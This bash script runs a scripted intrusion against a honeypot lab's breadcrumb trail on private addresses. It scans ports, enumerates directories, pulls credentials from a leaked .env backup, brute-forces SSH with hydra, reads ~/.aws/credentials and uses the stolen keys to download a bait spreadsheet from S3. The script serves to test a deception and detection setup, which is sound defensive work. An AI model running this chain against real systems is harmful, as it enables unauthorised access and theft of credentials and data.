#!/usr/bin/env bash
# Scripted attack campaign: walk the whole Mirage breadcrumb trail the way a
# real intruder would, with the lab's own tools. Every step prints a timestamp
# so the run can be read back against the controller's records.
#
# Trail: scan -> dir enum -> robots.txt -> backup .env -> SSH brute + login
#        -> recon -> ~/.aws/credentials -> S3 list -> passwords.xlsx download
#
# Env: ADMIN=10.66.0.20  SSH=10.66.0.21  S3=10.66.0.22
set -u

ADMIN=${ADMIN:-10.66.0.20}
SSH_HOST=${SSH_HOST:-10.66.0.21}
S3=${S3:-10.66.0.22}
S3_PORT=${S3_PORT:-9000}

step() { echo "[$(date -u +%H:%M:%S.%3N)] $*"; }

step "1. port scan (nmap)"
nmap -Pn -p 22,80,9000 "$ADMIN" "$SSH_HOST" "$S3" >/dev/null 2>&1 || true

step "2. directory enumeration (gobuster) on the admin panel"
gobuster dir -q -u "http://$ADMIN" -w /usr/share/wordlists/dirb/common.txt -t 20 2>/dev/null | head -20 || true

step "3. read robots.txt (stage 1 honeytoken)"
curl -s "http://$ADMIN/robots.txt" | head -5

step "4. follow the disallowed path to the exposed backup .env (stage 2)"
curl -s "http://$ADMIN/backup/" >/dev/null
ENVBAK=$(curl -s "http://$ADMIN/backup/.env.bak")
echo "$ENVBAK"
DEPLOY_USER=$(printf '%s\n' "$ENVBAK" | sed -n 's/^DEPLOY_USER=//p' | tr -d '"' | tr -d "\r")
DEPLOY_PASS=$(printf '%s\n' "$ENVBAK" | sed -n 's/^DEPLOY_PASSWORD=//p' | tr -d '"' | tr -d "\r")
DEPLOY_USER=${DEPLOY_USER:-deploy}
step "   leaked SSH user=$DEPLOY_USER"

step "5. brute force a few wrong passwords (hydra) to show failed logins"
printf 'admin\nroot\npassword\n123456\n' > /tmp/wl.txt
hydra -l "$DEPLOY_USER" -P /tmp/wl.txt -t 4 -f "ssh://$SSH_HOST" >/dev/null 2>&1 || true

step "6. log in with the leaked password (stage 3) and run recon"
export SSHPASS="$DEPLOY_PASS"
SSHOPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 -o PreferredAuthentications=password -o PubkeyAuthentication=no"
run_ssh() { sshpass -e ssh $SSHOPTS "$DEPLOY_USER@$SSH_HOST" "$1" 2>/dev/null; }

run_ssh "id; uname -a; hostname" | head -5
run_ssh "ls -la /home/$DEPLOY_USER; cat /home/$DEPLOY_USER/.bash_history" | head -20

step "7. read ~/.aws/credentials (stage 4)"
AWSCREDS=$(run_ssh "cat /home/$DEPLOY_USER/.aws/credentials")
echo "$AWSCREDS"
AKID=$(printf '%s\n' "$AWSCREDS" | sed -n 's/.*aws_access_key_id *= *//p' | tr -d "\r" | head -1)
SKEY=$(printf '%s\n' "$AWSCREDS" | sed -n 's/.*aws_secret_access_key *= *//p' | tr -d "\r" | head -1)

step "8. use the stolen cloud keys against the S3 endpoint (stage 5)"
export AWS_ACCESS_KEY_ID="$AKID"
export AWS_SECRET_ACCESS_KEY="$SKEY"
export AWS_DEFAULT_REGION=us-east-1
EP="http://$S3:$S3_PORT"
aws --endpoint-url "$EP" s3 ls 2>/dev/null || true
aws --endpoint-url "$EP" s3 ls s3://corp-backups/finance/ 2>/dev/null || true

step "9. download the bait spreadsheet (stage 6)"
aws --endpoint-url "$EP" s3 cp s3://corp-backups/finance/passwords.xlsx /tmp/passwords.xlsx 2>/dev/null \
    && step "   downloaded $(wc -c < /tmp/passwords.xlsx) bytes" \
    || step "   download blocked or failed (contained?)"

step "campaign complete"
